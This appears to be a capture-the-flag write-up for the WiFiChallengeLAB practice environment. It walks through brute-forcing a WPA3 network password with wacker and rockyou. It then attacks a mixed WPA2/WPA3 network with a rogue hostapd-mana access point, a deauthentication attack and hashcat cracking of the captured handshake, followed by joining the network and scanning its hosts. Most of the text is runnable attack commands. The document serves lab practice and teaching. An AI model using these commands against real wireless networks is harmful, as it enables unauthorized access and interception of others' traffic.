With WPA2, hackers could still break into the WiFi network relatively easily and then read the network traffic. If both the access point (router, access point) and the device to be connected (the client; smartphone, laptop, etc.) support WPA3, you will benefit from the most optimal security. However, if you got a weak password....well we can still try to crack it and gain access to the network. If you still have a device such as a smartphone or laptop with WPA2 support, it is not the end of the world. These devices will still work on WPA3 networks for the time being, but without the additional security benefits. In this case we can downgrade and attack the network as well. In the following challenges on WiFiChallengeLAB we can practice both scenarios.

## What is the wifi-management password?
Let's scan the envronment on available WiFi networks. With the following command we can get a nice overview.
```bash
nmcli dev wifi list
```

We can see that the WiFi network `wifi-management` is running on channel 11 and using WPA3.
Next we should before we start kill all running processes.
```bash
sudo airmon-ng check kill
```
After killing the running processes we should start monitor mode on wlan0 interface.
```bash
sudo airmon-ng start wlan0
```
As soon as the monitor mode is set to the interface we can check other information such as clients connected to this network.
```bash
sudo airodump-ng wlan0mon --band abg -c 11
```

We did not discover anything useful yet. We might run a brute force attack with wacker. To run this we need to know the frequency of the network channel.
We can check this on [wikipedia](https://en.wikipedia.org/wiki/List_of_WLAN_channels).

![Image](/assets/img/WriteUp/WiFiChallengeLAB/Pasted image 20231212210514.png){: width="700" height="400" }

For channel 11 we should use this argument `--freq 2462`. The command below is to bruteforce for a password.
```bash
./wacker.py --wordlist ~/rockyou-top100000.txt --ssid wifi-management --bssid F0:9F:C2:11:0A:24 --interface wlan2 --freq 2462
```

After a few minutes we gain the password for our target network.

## What is the wifi-IT password?
Letâ€™s scan the envronment on available WiFi networks. With the following command we can get a nice overview.
```bash
nmcli dev wifi list
```
![Image](/assets/img/WriteUp/WiFiChallengeLAB/Pasted image 20231017195629.png){: width="700" height="400" }

In this scenario `wifi-IT` is our target network and it is running on WPA2 and WPA3. This gives us the possibility to attack this network with WPA2.
We can also see that the network is running on channel 11. Next we should before we start kill all running processes.
```bash
sudo airmon-ng check kill
```
Then we need to enable monitor mode on our interface.
```bash
sudo airmon-ng start wlan0
```
We can check if the monitor mode is set with `iwconfig`.
```bash
iwconfig
```
Let's run airodump to see what we can discover more on our target network.
```bash
sudo airodump-ng wlan0mon --band abg -w wifi-IT -c 11
```
![Image](/assets/img/WriteUp/WiFiChallengeLAB/Pasted image 20231017204658.png){: width="700" height="400" }

There is a workstation connected to our target network. Let's inspect some network traffic in Wireshark.
```bash
sudo wireshark wifi-IT-02.cap
```
![Image](/assets/img/WriteUp/WiFiChallengeLAB/Pasted image 20231017204959.png){: width="700" height="400" }
When we inspect the package we can see thata deauthentication attack can be performed since the MFP (or PFM) is set to disable (0) 
Let's create a configuration file for our Rogue Access Point.
```bash
nano hostapd-sae.conf
```
The content of `hostapd-sae.conf` should look like this.
```
interface=wlan1
driver=nl80211
hw_mode=g
channel=11
ssid=wifi-IT
mana_wpaout=hostapd-management.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678
```
After saving the configuration file we can start our Rogue Access Point.
```bash
hostapd-mana hostapd-sae.conf
```
Next we should launch a deauthentication attack against our target entwork so the workstation will try to connect to our Rogue Access Point.
```bash
aireplay-ng wlan0mon -0 0 -a F0:9F:C2:1A:CA:25  -c 10:F9:6F:AC:53:52
```
![Image](/assets/img/WriteUp/WiFiChallengeLAB/Pasted image 20231017205956.png){: width="700" height="400" }

As soon as the workstation tries to connect to our Rogue Access Point we capture the handshake. Next we can crack the handshake with hashcat just like in the WPA2 networks.
```bash
hashcat -a 0 -m 2500 hostapd-management.hccapx ~/rockyou-top100000.txt --force
```
![Image](/assets/img/WriteUp/WiFiChallengeLAB/Pasted image 20231017210410.png){: width="700" height="400" }

Since we now have the password of the target network we can create the configuration file to connect to the target network.
```bash
wpa_passphrase wifi-IT CRACKED-PASSWORD > wifi-IT.conf
```
Let's connect to the target entwork with wpa_supplicant.
```bash
wpa_supplicant -D nl80211 -i wlan3 -c wifi-IT.conf
```
After connecting we should ask for an IP address to the DHCP server.
```bash
dhclient wlan3 -v
```
If an IP address has been assigned to us, we can identify hosts on the network with a simple arp-scan.  
```bash
arp-scan -l -I wlan3
```
